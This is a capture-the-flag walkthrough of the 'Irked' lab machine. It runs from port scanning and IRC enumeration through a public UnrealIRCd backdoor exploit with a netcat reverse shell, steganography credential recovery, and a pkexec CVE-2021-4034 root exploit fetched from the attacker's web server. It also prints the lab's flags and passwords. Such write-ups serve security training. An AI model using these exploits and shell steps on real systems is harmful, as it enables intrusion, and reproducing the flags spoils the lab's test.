# CTF Writeup: Irked

## Lab Description

Irked is a pretty simple and straight-forward box which requires basic enumeration skills. It shows the need to scan all ports on machines and to investigate any out of the place binaries found while enumerating a system. 

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 10.129.152.88 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 11:35 EDT
Nmap scan report for 10.129.152.88
Host is up (0.050s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36674/udp   status
|   100024  1          39680/udp6  status
|   100024  1          52490/tcp   status
|_  100024  1          53451/tcp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
52490/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 2 hops
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   43.03 ms 10.10.14.1
2   43.22 ms 10.129.152.88

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds
```

We retrieve information about an rpcirc, http & ssh running. SSH doesn't seem to be vulnerable and http is just refering to irc almost running. I'm assuming we need to exploit the rpcirc service in order to get initial access.

When trying to connect to UnrealIRCd (irc), it tries to connect us to an domain called "irked.htb", but fails!

```
nc 10.129.152.88 6697
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
ERROR :Closing Link: [10.10.14.186] (Ping timeout)
```

Let's map the domain irked.htb to the target ip in our local dns file /etc/hosts

```
sudo echo "10.129.152.88 irked.htb" | sudo tee -a /etc/hosts
```

Even after adding it, it doesn't work. Googled for an documentation online and found one, regarding establishing/registrying connection to the irc server.

```
https://datatracker.ietf.org/doc/html/rfc1459#section-4.1
```

Followed the documentation and typed in variables PASS,NICK & USER and gained information about the irc server.


```
 nc irked.htb 6697
:irked.htb NOTICE AUTH :*** Looking up your hostname...
PASS password
NICK saitama
USER saitama hostname2 servernam2 :kpwasichschreibensoll
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
:irked.htb 001 saitama :Welcome to the ROXnet IRC Network saitama!saitama@10.10.14.186
:irked.htb 002 saitama :Your host is irked.htb, running version Unreal3.2.8.1
:irked.htb 003 saitama :This server was created Mon May 14 2018 at 13:12:50 EDT
:irked.htb 004 saitama irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
:irked.htb 005 saitama UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 :are supported by this server
:irked.htb 005 saitama WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ :are supported by this server
:irked.htb 005 saitama EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP :are supported by this server
:irked.htb 251 saitama :There are 1 users and 0 invisible on 1 servers
:irked.htb 253 saitama 1 :unknown connection(s)
:irked.htb 255 saitama :I have 1 clients and 0 servers
:irked.htb 265 saitama :Current Local Users: 1  Max: 1
:irked.htb 266 saitama :Current Global Users: 1  Max: 1
:irked.htb 422 saitama :MOTD File is missing
:saitama MODE saitama :+iwx
```

Retrieved information "Roxnet" and "Unreal3.2.8.1". Let's search up for CVE's on both parameters.

Found an PoC for Unreal 3.2.8.1

```
git clone https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor.git
```

downloaded the exploit locally and modified the code to add my ip and port 1337 in all -payload options.

Made the script executable

```
chmod +x exploit.py
```

Started up my listener on port 1337

```
nc -lvnp 1337
```

Ran the exploit.


```
python3 exploit.py -payload bash 10.129.152.88 6697
Exploit sent successfully!
```


Gained RCE as user "ircd"

```
nc -lvnp 1337    
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.152.88] 57863
bash: cannot set terminal process group (624): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$
```

Enumerated users on the target system.

```
ircd@irked:~/Unreal3.2$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
djmardov:x:1000:1000:djmardov,,,:/home/djmardov:/bin/bash
```

Found password in /home/djmardov/Documents/.backup


```
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

This password seems to be for "steg" --> steganography --> there was an picture on the webpage. Let's download it on our local machine and run steghide extract on it.

```
wget http://irked.htb/irked.jpg
--2025-10-26 14:24:35--  http://irked.htb/irked.jpg
Resolving irked.htb (irked.htb)... 10.129.152.88
Connecting to irked.htb (irked.htb)|10.129.152.88|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 34697 (34K) [image/jpeg]
Saving to: ‘irked.jpg’

irked.jpg                      100%[=================================================>]  33.88K  --.-KB/s    in 0.05s   

2025-10-26 14:24:35 (646 KB/s) - ‘irked.jpg’ saved [34697/34697]
```
```
steghide extract -sf irked.jpg
Enter passphrase: 
wrote extracted data to "pass.txt"
```

We gained an password, prob of djmardov:Kab6h+m+bbp2J:HG


```
cat pass.txt                
Kab6h+m+bbp2J:HG
```

Logged into user djmardov via ssh.


```
ssh djmardov@irked.htb        
djmardov@irked.htb's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$
```

Retrieved user.txt in /home/djmardov directory.


```
dcb53ca33c45e736f22b72258ed9855d
```

Searched up for exploitable SUID Binaries on the target system.


```
djmardov@irked:/$ find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
```

pkexec looks promising, let's check for version.


```
/usr/bin/pkexec --version
pkexec version 0.105
```

Found CVE-2021-4034 and an PoC for it:

```
git clone https://github.com/rvizx/CVE-2021-4034.git
```

Started up a python3 server to download the file on to the target system

```
python3 -m http.server 80
```
```
cd /tmp
wget http://10.10.14.186/cve-2021-4034-poc.py
```

Made the script executable

```
chmod +x cve-2021-4034-poc.py
```

Ran the script and gained root shell.

```
djmardov@irked:/tmp$ python3 cve-2021-4034-poc.py 
# whoami
root
```

Retrieved root.txt in /root directory.

```
03ef860a43a0526bd62cade4bc8a3e54
```
